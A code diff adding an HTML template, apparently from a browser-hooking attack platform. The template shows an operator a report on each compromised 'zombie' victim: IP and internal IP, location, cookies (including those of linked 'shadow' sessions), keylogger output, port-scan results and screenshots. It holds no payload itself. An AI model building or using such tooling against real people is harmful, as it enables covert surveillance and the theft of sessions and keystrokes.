@@ -1,0 +1,144 @@
+{% extends "new-base.html" %}
+{% load w2gfilter %}
+{% block title %}Report{% endblock %}
+{% block nav_cc_on %}nav_on{% endblock %}
+
+{% block body %}
+<div class="container report-wrapper">
+    <h2>Zombie-{{zombie.id}}的隐私报告</h2>
+    <p>备注：{{zombie.desc}}</p>
+    <h4 class="text-info">基本信息</h4>
+    <table class="table table-striped">
+        <thead>
+            <tr>
+                <th>Key</th>
+                <th>Value</th>
+            </tr>
+        </thead>
+        <tbody>
+			<tr>
+				<td>up time</td>
+				<td>{{zombie.up_time|date:"Y-m-d H:i"}}</td>
+			</tr>
+			<tr>
+				<td>born time</td>
+				<td>{{zombie.born_time|date:"Y-m-d H:i"}}</td>
+			</tr>
+			<tr>
+				<td>system time</td>
+				<td>{{zombie.local_time}}</td>
+			</tr>
+			<tr>
+				<td>domain</td>
+				<td>{{zombie.group}}</td>
+			</tr>
+			<tr>
+				<td>os</td>
+				<td>{{zombie.os}}</td>
+			</tr>
+			<tr>
+				<td>cpu cores</td>
+				<td>{{zombie.cpu_cores}}</td>
+			</tr>
+			<tr>
+				<td>memory size</td>
+				<td>{{zombie.memory}} GB</td>
+			</tr>
+			<tr>
+				<td>browser</td>
+				<td>{{zombie.browser}}</td>
+			</tr>
+			<tr>
+				<td>title</td>
+				<td>{{zombie.title}}</td>
+			</tr>
+			<tr>
+				<td>User-Agent</td>
+				<td>{{zombie.user_agent}}</td>
+			</tr>
+			<tr>
+				<td>referer</td>
+				<td>{{zombie.referer|default:"-"}}</td>
+			</tr>
+			<tr>
+				<td>location</td>
+				<td>{{zombie.location}}</td>
+			</tr>
+			<tr>
+				<td>ip</td>
+				<td>{{zombie.ip}}</td>
+			</tr>
+			<tr>
+				<td>运营商ISP</td>
+				<td>{{zombie_detail.isp.0.info|default:"-"}}</td>
+			</tr>
+			<tr>
+				<td class="text-danger">内网ip</td>
+				<td class="text-danger">{{zombie_detail.innerip.0.info|default:"-"}}</td>
+			</tr>
+			<tr>
+				<td>Cookie</td>
+				<td>{{zombie.cookie}}</td>
+			</tr>
+			<tr>
+				<td>screen size</td>
+				<td>{{zombie.screen}}</td>
+			</tr>
+		</tbody>
+	</table>
+
+    <h4 class="text-info">更多信息</h4>
+
+    <h5 title="一个僵尸用户使用水印进行唯一标识，它有可能使用了多个浏览器或者其它IP，这些差异都会产生一个影子。即一个僵尸用户对应多个影子。">影子信息</h5>
+    <blockquote>
+        {%for shadow in zombie_shadows%}
+			<p class="text-muted">
+            	<strong>{{shadow.browser}} | {{shadow.born_time|date:"Y-m-d H:i"}} - {{shadow.up_time|date:"Y-m-d H:i"}}</strong>
+            </p>
+			IP: {{shadow.ip}}<br />
+			User-Agent: {{shadow.user_agent}}<br />
+			Cookie: {{shadow.cookie}}<br />
+		{%endfor%}
+    </blockquote>
+
+	{% if zombie_detail.keylog %}
+	    <h5>键盘记录</h5>
+	    <blockquote>
+	    	{% for d in zombie_detail.keylog %}
+				<p class="text-muted">{{d.time|date:"Y-m-d H:i"}}</p>
+				{{d.info}}
+			{% endfor %}
+	    </blockquote>
+    {% endif %}
+
+	{% if zombie_detail.port %}
+	    <h5>端口信息</h5>
+	    <blockquote>
+	    	{% for d in zombie_detail.port %}
+				<p class="text-muted">{{d.time|date:"Y-m-d H:i"}}</p>
+				{{d.info}}
+			{% endfor %}
+	    </blockquote>
+    {% endif %}
+
+	{% if zombie_detail.ping %}
+	    <h5>主机存活</h5>
+	    <blockquote>
+			{% for d in zombie_detail.ping %}
+				<p class="text-muted">{{d.time|date:"Y-m-d H:i"}}</p>
+				{{d.info}}
+			{% endfor %}
+	    </blockquote>
+	{% endif %}
+	
+	{%if zombie_screenshots %}
+		<h5>屏幕截图</h5>
+		<blockquote>
+			{% for shot in zombie_screenshots %}
+				<img src="../../statics/screenshot/{{shot}}">
+			{% endfor %}
+		</blockquote>
+	{% endif %}
+</div>
+{% endblock %}
+
